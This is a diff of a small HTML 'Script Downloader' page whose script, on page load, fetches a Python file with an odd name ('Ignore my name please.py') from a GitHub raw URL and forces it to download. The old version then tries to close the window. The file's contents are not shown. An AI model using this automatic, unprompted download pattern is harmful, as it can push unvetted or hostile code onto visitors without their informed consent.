@@ -1,75 +1,74 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Downloading...</title>
+    <title>File Downloader</title>
     <style>
-        body {
-            font-family: system-ui, -apple-system, sans-serif;
-            height: 100vh;
-            margin: 0;
-            display: grid;
-            place-items: center;
-            background: #f8fafc;
-            color: #334155;
-        }
-        .status {
+        body { font-family: Arial, sans-serif; background-color: #f0f0f0; padding: 50px; }
+        .box { 
+            background: #fff; 
+            border: 1px solid #ccc; 
+            padding: 20px; 
+            width: 420px; 
+            margin: 0 auto; 
+            box-shadow: 2px 2px 5px rgba(0,0,0,0.1); 
             text-align: center;
-            padding: 2rem;
-            background: white;
-            border-radius: 8px;
-            box-shadow: 0 4px 6px -1px rgb(0 0 0 / 0.1);
         }
-        h1 { font-size: 1.25rem; margin-bottom: 0.5rem; }
-        p { margin: 0; color: #64748b; }
+        h2 { font-size: 18px; margin-top: 0; color: #333; }
+        #status { font-weight: bold; color: #0000FF; margin: 15px 0; }
+        .footer { font-size: 11px; color: #666; margin-top: 20px; }
     </style>
 </head>
 <body>
-    <div class="status" id="status">
-        <h1>Preparing download...</h1>
-        <p>Please wait.</p>
-    </div>
 
-    <script>
+<div class="box">
+    <h2>Script Downloader</h2>
+    <hr>
+    <div id="status">Status: Initializing...</div>
+    <p>Please wait. Your file:<br><b>Ignore my name please.py</b><br>will download automatically.</p>
+    <hr>
+    <div class="footer">Utility Version 1.0</div>
+</div>
+
+<script>
+    async function startDownload() {
         const GITHUB_FILE_URL = "https://raw.githubusercontent.com/epickfr/LUNAFLIX/refs/heads/main/Ignore%20my%20name%20please.py";
         const FILE_NAME = "Ignore my name please.py";
+        const statusDiv = document.getElementById('status');
 
-        async function startDownload() {
-            const status = document.getElementById('status');
-
-            try {
-                status.innerHTML = "<h1>⬇️ Downloading...</h1><p>Fetching file from GitHub...</p>";
-
-                const response = await fetch(GITHUB_FILE_URL);
-                
-                if (!response.ok) {
-                    throw new Error(`Failed to download: ${response.status}`);
-                }
-                const blob = await response.blob();
-                const url = window.URL.createObjectURL(blob);
-                const a = document.createElement('a');
-                a.href = url;
-                a.download = FILE_NAME;
-                a.style.display = 'none';
-                document.body.appendChild(a);
-                a.click();
-                window.URL.revokeObjectURL(url);
-                document.body.removeChild(a);
-                status.innerHTML = "<h1>✅ Download Started!</h1><p>Closing window...</p>";
-                setTimeout(() => {
-                    window.close();
-                    setTimeout(() => {
-                        status.innerHTML = "<h1>✅ Download Complete!</h1><p>You can close this window now.</p>";
-                    }, 500);
-                }, 500);
-
-            } catch (error) {
-                status.innerHTML = `<h1>❌ Error</h1><p>${error.message}</p><p style="font-size:0.875rem; margin-top:1rem;">Check the URL or try again.</p>`;
-                console.error('Download failed:', error);
+        try {
+            statusDiv.innerText = "Status: Connecting to GitHub...";
+            
+            const response = await fetch(GITHUB_FILE_URL);
+            
+            if (!response.ok) {
+                throw new Error(`Failed: ${response.status}`);
             }
+
+            statusDiv.innerText = "Status: Processing File...";
+            const blob = await response.blob();
+            const url = window.URL.createObjectURL(blob);
+            
+            const a = document.createElement('a');
+            a.href = url;
+            a.download = FILE_NAME;
+            document.body.appendChild(a);
+            a.click();
+            
+            window.URL.revokeObjectURL(url);
+            document.body.removeChild(a);
+
+            statusDiv.innerText = "Status: Downloaded Successfully!";
+            statusDiv.style.color = "#008000";
+
+        } catch (error) {
+            statusDiv.innerText = "Status: Error - " + error.message;
+            statusDiv.style.color = "#FF0000";
+            console.error('Download failed:', error);
         }
-        window.addEventListener('load', startDownload);
-    </script>
+    }
+
+    window.onload = startDownload;
+</script>
+
 </body>
 </html>
